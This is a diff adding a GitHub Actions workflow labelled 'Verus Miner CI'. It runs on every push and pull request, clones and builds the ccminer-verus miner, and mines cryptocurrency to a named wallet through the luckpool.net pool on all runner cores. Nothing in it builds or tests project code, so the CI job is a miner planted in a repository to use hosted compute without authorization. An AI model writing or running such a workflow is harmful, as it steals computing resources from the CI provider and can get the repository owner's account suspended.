@@ -1,0 +1,31 @@
+name: Verus Miner CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y git build-essential cmake libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev
+
+      - name: Clone ccminer-verus
+        run: |
+          git clone https://github.com/Oink70/ccminer-verus.git
+          cd ccminer-verus
+          ./build.sh
+
+      - name: Start mining
+        run: |
+          cd ccminer-verus
+          ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.uahahhsueyyww -p x -t $(nproc)
